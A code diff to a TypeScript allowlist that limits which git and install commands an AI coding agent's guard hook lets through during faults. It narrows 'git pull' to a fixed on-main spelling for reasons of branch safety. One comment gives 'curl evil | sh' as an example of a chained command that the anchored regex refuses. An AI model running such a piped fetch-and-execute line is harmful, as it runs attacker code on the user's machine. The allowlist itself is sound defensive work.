@@ -140,10 +140,10 @@ export const RECOVERY_ALLOW_JS =
 // The exact command we tell the human/assistant to run to recover a corrupt node_modules.
 export const RECOVERY_CMD = 'rm -rf node_modules && pnpm install';
 
-// Git SYNC commands. Part of the ONE L0 allowlist (see L0_ALLOW_ERE), so they are allowed under EVERY
-// L0 fault, not just drift. They used to be gated on drift alone, on the reasoning that no amount of
+// `git fetch`. Part of the ONE L0 allowlist (see L0_ALLOW_ERE), so it is allowed under EVERY
+// L0 fault, not just drift. It used to be gated on drift alone, on the reasoning that no amount of
 // git can fix a missing/broken bin. True but irrelevant: an allowlist entry that cannot help also
-// cannot hurt, and the gating had a real cost — under a stale committed shim, `git pull` is the ONLY
+// cannot hurt, and the gating had a real cost — under a stale committed shim, a git sync is the ONLY
 // cure when the CHECKOUT is the stale side, and it was denied. Ungating it removes that trap.
 //
 // `merge` was REMOVED from this list. It was accepted here while the guards are DOWN, and the drift
@@ -160,23 +160,72 @@ export const RECOVERY_CMD = 'rm -rf node_modules && pnpm install';
 // that is BEHIND origin, and now the PIN is the stale side while node_modules is correct and NEWER.
 //
 // In that inverse case `pnpm install` is not the cure, it is the disease: it happily DOWNGRADES
-// node_modules to the stale pin. The real cure is `git pull` — which the guard denied, because the
+// node_modules to the stale pin. The real cure is a git sync — which the guard denied, because the
 // allowlist only ever contained the installer. So the assistant was told to run the one command that
 // made things worse, while the fix was blocked. Allow the sync commands here and the deadlock is gone.
 //
+// `pull` WAS THEN REMOVED FROM THIS ENTRY (2026-08-10, audit finding C6) — which is why it is now named
+// for the fetch subcommand alone. The entry was `(pull|fetch)` and marked TERMINAL ('allow'), so it
+// short-circuited every downstream guard. redirect-how-to-merge-main exists to block exactly one thing:
+// `git pull origin main` on a FEATURE branch, because a raw pull there merges main INTO the branch and
+// destroys the fork point that the 3-point merge, `nx affected --base=` and the PR review diff are all
+// computed from. Under an L0 fault the drift message TOLD the agent to run `git pull origin main` and
+// this entry PERMITTED it, on whatever branch it happened to be standing on. The damage is silent: it
+// surfaces later as a build gate that rebuilt the wrong scope and a PR diff describing work nobody did.
+//
+// The fetch subcommand cannot merge anything, so it can never poison a fork point, and it stays terminal
+// here. `git pull` now falls THROUGH to redirect-how-to-merge-main, which allows it on main and blocks
+// it on a feature branch — the correct matrix, and the one that guard was written to enforce. A BARE
+// `git pull` (syncing a shared feature branch with origin/<same-branch>) is not blocked by that guard
+// either; it simply is no longer waved past every OTHER guard on the way. The on-main cure keeps a
+// terminal spelling of its own — CHECKOUT_MAIN_PULL_BODY_ERE below.
+//
 // Kept exactly as tight as INSTALLER_ALLOW_ERE: anchored at both ends, and every argument token is a
 // bare word or `--flag` — so no shell operator (`;`, `&&`, `|`, backticks, `$()`, `>`) can ride along.
-// `git pull; curl evil | sh` still FAILS CLOSED. Deliberately NOT `git checkout`: switching branches is
-// what CAUSES this drift, and a fail-closed escape hatch should only contain cures.
-// Keep in sync with SYNC_ALLOW_JS below (locked by a unit test).
-const SYNC_BODY_ERE = 'git[[:space:]]+(pull|fetch)([[:space:]]+(--)?[A-Za-z0-9][A-Za-z0-9=._/@:-]*)*';
-export const SYNC_ALLOW_ERE =
-    CD_PREFIX_ERE_ANCHORED + SYNC_BODY_ERE + CAPTURE_TAIL_ERE;
+// A trailing `; curl evil | sh` still FAILS CLOSED. Deliberately NOT a general `git checkout`: switching
+// branches is what CAUSES this drift, and a fail-closed escape hatch should only contain cures.
+// Keep in sync with FETCH_ALLOW_JS below (locked by a unit test).
+// webpieces-disable no-fetch -- a POSIX ERE matching the git subcommand of that name, not an HTTP call
+const FETCH_BODY_ERE = 'git[[:space:]]+fetch([[:space:]]+(--)?[A-Za-z0-9][A-Za-z0-9=._/@:-]*)*';
+export const FETCH_ALLOW_ERE =
+    CD_PREFIX_ERE_ANCHORED + FETCH_BODY_ERE + CAPTURE_TAIL_ERE;
 
-// JS-regex twin of SYNC_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts the two agree.
-const SYNC_BODY_JS = 'git\\s+(pull|fetch)(\\s+(--)?[A-Za-z0-9][A-Za-z0-9=._/@:-]*)*';
-export const SYNC_ALLOW_JS =
-    new RegExp(CD_PREFIX_JS_ANCHORED + SYNC_BODY_JS + CAPTURE_TAIL_JS_SRC);
+// JS-regex twin of FETCH_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts the two agree.
+// webpieces-disable no-fetch -- the JS twin of the ERE above; still the git subcommand, not an HTTP call
+const FETCH_BODY_JS = 'git\\s+fetch(\\s+(--)?[A-Za-z0-9][A-Za-z0-9=._/@:-]*)*';
+export const FETCH_ALLOW_JS =
+    new RegExp(CD_PREFIX_JS_ANCHORED + FETCH_BODY_JS + CAPTURE_TAIL_JS_SRC);
+
+// THE ONE PULL SPELLING THAT IS ALWAYS FORK-POINT-SAFE — the other half of the C6 fix above.
+//
+// `git checkout main && git pull origin main` ends on MAIN. The feature branch is not checked out, not
+// merged into, not touched at all: there is no fork point to destroy, on any branch, ever. That is what
+// earns it a terminal entry on a list where a bare `git pull origin main` no longer has one. It is also,
+// word for word, the cure `stale-main-bash-guard` calls its PREFERRED option, and it satisfies that
+// guard's "the pull must be in the SAME command" rule — so the guard that prescribes it and the
+// allowlist that admits it finally spell it identically. When the agent is ALREADY on main the checkout
+// is a harmless no-op, so this one literal covers the on-main case too and needs no second entry.
+//
+// A NARROW LITERAL, deliberately. The rationale above — `git checkout` is what CAUSES this drift, and a
+// fail-closed hatch should only contain cures — is intact: `main` is hard-coded, no flags are accepted,
+// and there is NO general `git checkout <branch> &&` prefix. `git checkout feat && git pull origin main`,
+// the exact command redirect-how-to-merge-main blocks, stays REFUSED here; so do `git checkout main`
+// alone (it cures nothing) and anything chained onto either end.
+// Keep in sync with CHECKOUT_MAIN_PULL_BODY_JS below (locked by a unit test).
+const CHECKOUT_MAIN_PULL_BODY_ERE =
+    'git[[:space:]]+checkout[[:space:]]+main[[:space:]]*&&[[:space:]]*git[[:space:]]+pull[[:space:]]+origin[[:space:]]+main';
+
+// JS-regex twin of CHECKOUT_MAIN_PULL_BODY_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts they agree.
+const CHECKOUT_MAIN_PULL_BODY_JS =
+    'git\\s+checkout\\s+main\\s*&&\\s*git\\s+pull\\s+origin\\s+main';
+
+export const CHECKOUT_MAIN_PULL_ALLOW_ERE =
+    CD_PREFIX_ERE_ANCHORED + CHECKOUT_MAIN_PULL_BODY_ERE + CAPTURE_TAIL_ERE;
+export const CHECKOUT_MAIN_PULL_ALLOW_JS =
+    new RegExp(CD_PREFIX_JS_ANCHORED + CHECKOUT_MAIN_PULL_BODY_JS + CAPTURE_TAIL_JS_SRC);
+
+/** The exact bytes every message prescribing the on-main sync must print. */
+export const CHECKOUT_MAIN_PULL_CMD = 'git checkout main && git pull origin main';
 
 // The CURE for the committed-shim self-guard (now enforced by the binary — see committedShimStale
 // below): regenerate .claude/webpieces/ai-hook.sh from renderShim(). Allowed while that guard is up —
@@ -459,9 +508,14 @@ export const L0_ALLOWLIST: readonly L0AllowEntry[] = [
         new L0Call('Bash', 'pnpm install', '')),
     new L0AllowEntry(`${RECOVERY_CMD} - the cure for a CORRUPT node_modules`, 'allow', true, RECOVERY_BODY_ERE, RECOVERY_BODY_JS,
         new L0Call('Bash', RECOVERY_CMD, '')),
-    // webpieces-disable no-fetch -- prose naming the git sync commands in a doc label, not an HTTP call
-    new L0AllowEntry('git pull / git fetch - merge is NOT on the list', 'allow', true, SYNC_BODY_ERE, SYNC_BODY_JS,
-        new L0Call('Bash', 'git pull', '')),
+    // webpieces-disable no-fetch -- prose naming the git sync subcommand in a doc label, not an HTTP call
+    new L0AllowEntry('git fetch - a bare git pull and git merge are NOT on the list', 'allow', true, FETCH_BODY_ERE, FETCH_BODY_JS,
+        new L0Call('Bash', 'git fetch', ''),
+        [new L0Call('Bash', 'git fetch --prune origin main', '')]),
+    // The one fork-point-safe pull: it ends on MAIN, so no feature branch is merged into. A bare
+    // `git pull origin main` is deliberately NOT here — see CHECKOUT_MAIN_PULL_BODY_ERE.
+    new L0AllowEntry(CHECKOUT_MAIN_PULL_CMD, 'allow', true, CHECKOUT_MAIN_PULL_BODY_ERE, CHECKOUT_MAIN_PULL_BODY_JS,
+        new L0Call('Bash', CHECKOUT_MAIN_PULL_CMD, '')),
     new L0AllowEntry(UPGRADE_SHIM_CMD, 'allow', true, UPGRADE_SHIM_BODY_ERE, UPGRADE_SHIM_BODY_JS,
         new L0Call('Bash', UPGRADE_SHIM_CMD, '')),
     new L0AllowEntry(RESTORE_SHIM_CMD, 'allow', true, RESTORE_SHIM_BODY_ERE, RESTORE_SHIM_BODY_JS,
